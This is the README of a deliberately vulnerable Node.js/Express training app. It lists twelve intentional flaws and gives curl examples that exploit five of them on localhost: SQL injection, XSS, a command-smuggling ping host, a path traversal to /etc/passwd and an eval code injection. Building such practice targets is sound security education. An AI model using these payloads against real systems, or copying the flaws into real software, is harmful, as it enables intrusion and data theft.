# Vulnerable Node.js Application

⚠️ **WARNING**: This application contains intentional security vulnerabilities for testing and educational purposes only. **DO NOT** deploy this application in production or expose it to the internet!

## Description

This is a deliberately vulnerable Node.js/Express application designed for security testing, penetration testing practice, and learning about common web application vulnerabilities.

## Vulnerabilities Included

1. **Hardcoded Credentials** - Sensitive credentials stored in source code
2. **CORS Misconfiguration** - Allows requests from any origin
3. **SQL Injection** - Unparameterized SQL queries in `/login` endpoint
4. **Cross-Site Scripting (XSS)** - Reflected XSS in `/search` endpoint
5. **Command Injection** - OS command injection in `/ping` endpoint
6. **Path Traversal** - Directory traversal in `/download` endpoint
7. **Insecure Direct Object Reference (IDOR)** - Direct access to user data via `/user/:id`
8. **Code Injection (eval)** - Dangerous eval() usage in `/calculate` endpoint
9. **Information Disclosure** - Sensitive data exposure in `/debug` endpoint
10. **Mass Assignment** - No input validation in `/register` endpoint
11. **No Rate Limiting** - Brute force attacks possible on `/brute-force-me`
12. **Prototype Pollution** - Vulnerable object assignment in `/update-config`

## Installation

```bash
npm install
```

## Running the Application

```bash
npm start
```

The application will start on `http://localhost:3000`

## Testing Examples

### SQL Injection
```bash
curl -X POST http://localhost:3000/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin'\'' OR '\''1'\''='\''1", "password": "anything"}'
```

### XSS
```bash
curl "http://localhost:3000/search?q=<script>alert('XSS')</script>"
```

### Command Injection
```bash
curl -X POST http://localhost:3000/ping \
  -H "Content-Type: application/json" \
  -d '{"host": "127.0.0.1; ls -la"}'
```

### Path Traversal
```bash
curl "http://localhost:3000/download?file=../../../etc/passwd"
```

### Code Injection
```bash
curl -X POST http://localhost:3000/calculate \
  -H "Content-Type: application/json" \
  -d '{"expression": "require('\''os'\'').platform()"}'
```

## Disclaimer

This application is for **EDUCATIONAL AND TESTING PURPOSES ONLY**. The vulnerabilities are intentional and should never be replicated in production code. Use this application only in isolated, controlled environments.

## License

ISC